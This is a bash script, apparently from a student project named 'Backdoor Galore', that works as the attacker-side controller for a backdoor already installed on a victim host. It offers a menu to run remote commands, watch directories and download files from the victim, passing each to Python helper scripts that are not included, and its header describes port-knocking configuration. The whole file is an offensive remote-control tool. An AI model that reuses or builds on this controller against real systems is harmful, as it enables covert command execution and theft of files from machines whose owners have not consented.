#! /bin/bash
#
#   Details     -
#   Attacker script that connects to a running backdoor
#
#   Config File -
#   [Attacking Host]
#   [Victim Host - Backdoor]
#   [Port]
#   [Protocol - TCP, UDP, etc.]
#   [Port Knocking Password]
#
#   Usage       -
#   ./attacker.sh
#
#   Author  Date        Description
#   GSM     NOV-16      Test Running Python Code
#   GSM     NOV-18      File Extraction and Processing
#   GSM     DEC-02      Configurable Protocol Implementation
#

#   Execute Command
ExecuteCommand ( )
{
    read -p "[+] Enter Command: " command

    #   -c [command to execute]
    python2 runcommand.py -c "$command"
}

#   Start Watch Directory
WatchFile ( )
{
    read -p "[+] Enter Directory: " directory
    #read -p "[+] Enter File: " file

    #   -m [mode]
    #   -d [directory to watch]
    #   -f [file in that directory to return on creation]
    python2 watchdirectory.py -m watch -d $directory
}

#   Download File
DownloadFile ( )
{
    read -p "[+] Enter Directory: " directory
    read -p "[+] Enter File: " file

    #   -m [mode]
    #   -d [directory to watch]
    #   -f [file in that directory to return on creation]
    python2 fileextraction.py -m download -d $directory -f $file
}

#   Main
echo "@--------------------------------------------@"
echo "|   Welcome to the Backdoor Galore Attacker  |"
echo "|                                            |"
echo "|   Authors: Garik Smith-Manchip             |"
echo "|            Alexandru Micsoniu              |"
echo "@--------------------------------------------@"
echo ""

PS3="[+] Enter Mode: "

COLUMNS=12
select mode in "Execute Command" "Watch Directory" "Download File" "Quit"
do
    case $mode in
        "Execute Command")      ExecuteCommand;;
        "Watch Directory")      WatchFile;;
        "Download File")        DownloadFile;;
        "Quit")                 break;;
        *)                      echo "Invalid: $REPLY";;
    esac
done

echo ""
